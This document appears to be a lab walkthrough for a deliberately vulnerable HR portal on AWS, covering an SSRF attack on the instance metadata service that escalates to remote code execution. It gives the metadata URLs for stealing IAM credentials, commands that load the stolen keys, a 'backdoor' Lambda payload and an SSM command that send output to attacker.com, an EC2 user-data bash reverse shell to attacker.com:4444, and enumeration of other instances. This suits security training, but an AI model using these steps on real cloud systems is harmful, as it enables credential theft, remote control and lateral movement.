
# Attack 2: Server-Side Request Forgery (SSRF) to Remote Code Execution (RCE)

SSRF allows attackers to make the server perform HTTP requests to internal resources. This can be escalated to Remote Code Execution in certain scenarios.

## Step 1: Access the Document Upload Page

1. First, log in to the HR Portal (you can use the SQL injection from Attack 1)
2. Navigate to the Document Upload page (`/documents`)

## Step 2: Performing the SSRF Attack

1. Select any file to upload (the content doesn't matter)
2. Look for the "Upload Destination URL" field
3. By default, it will contain `s3://employee-bucket/documents/`
4. Change the upload URL to: `http://169.254.169.254/latest/meta-data/`
5. Click "Upload Document"
6. Observe the response displayed in the "Response" section below the upload form

## Step 3: Extract IAM Credentials

1. Change the upload URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role`
2. Click "Upload Document"
3. This will return temporary AWS credentials including:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token`
4. Save these credentials for the next steps

## Step 4: Configure AWS CLI with the Stolen Credentials

```bash
# Configure AWS CLI with the stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...  # Use the AccessKeyId from Step 3
export AWS_SECRET_ACCESS_KEY=...  # Use the SecretAccessKey from Step 3
export AWS_SESSION_TOKEN=...      # Use the Token from Step 3
export AWS_DEFAULT_REGION=us-east-1  # Adjust region if necessary
```

## Step 5: Escalate SSRF to RCE

For escalating SSRF to RCE, there are several potential paths depending on the environment:

1. **Lambda Function Method**:
   - Using the stolen AWS credentials, create a malicious Lambda function
   ```bash
   # Create a file named function.zip containing your payload
   aws lambda create-function \
     --function-name backdoor \
     --runtime nodejs18.x \
     --role arn:aws:iam::account-id:role/lambda-execution-role \
     --handler index.handler \
     --zip-file fileb://function.zip
   
   # Invoke the function
   aws lambda invoke \
     --function-name backdoor \
     --payload '{}' \
     response.txt
   ```
   
   Sample payload for Lambda (in index.js):
   ```javascript
   exports.handler = async (event) => {
     const { exec } = require('child_process');
     return new Promise((resolve, reject) => {
       exec('curl http://attacker-server.com/$(whoami)', (error, stdout, stderr) => {
         resolve({
           statusCode: 200,
           body: { stdout, stderr }
         });
       });
     });
   };
   ```

2. **SSM Send Command Method**:
   - If the EC2 role has SSM permissions, you can execute commands directly on the instance
   ```bash
   # List all instances to find targets
   aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,Name:Tags[?Key=='Name']|[0].Value,State:State.Name,IP:PrivateIpAddress}"
   
   # Execute command on target instance
   aws ssm send-command \
     --document-name "AWS-RunShellScript" \
     --parameters commands=["curl http://attacker.com/$(whoami)"] \
     --targets "Key=instanceids,Values=i-1234567890abcdef0"
   ```

3. **EC2 Instance Profile Method**:
   - Create a new EC2 instance with a reverse shell in user data
   ```bash
   aws ec2 run-instances \
     --image-id ami-abcdef123456 \
     --instance-type t2.micro \
     --security-group-ids sg-abcdef123456 \
     --subnet-id subnet-abcdef123456 \
     --iam-instance-profile Name=hr-portal-ec2-role \
     --user-data "#!/bin/bash
     curl http://attacker.com/$(whoami)
     bash -i >& /dev/tcp/attacker.com/4444 0>&1"
   ```

## Step 6: Use AWS CLI to Discover Other EC2 Instances

```bash
# List all EC2 instances in the account
aws ec2 describe-instances

# Store the Jenkins server information
JENKINS_INSTANCE_ID=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].InstanceId" --output text)
JENKINS_PRIVATE_IP=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].PrivateIpAddress" --output text)
JENKINS_AZ=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].Placement.AvailabilityZone" --output text)
```

With this information, you can proceed to Attack 3 (Network Scanning) to probe the Jenkins server.
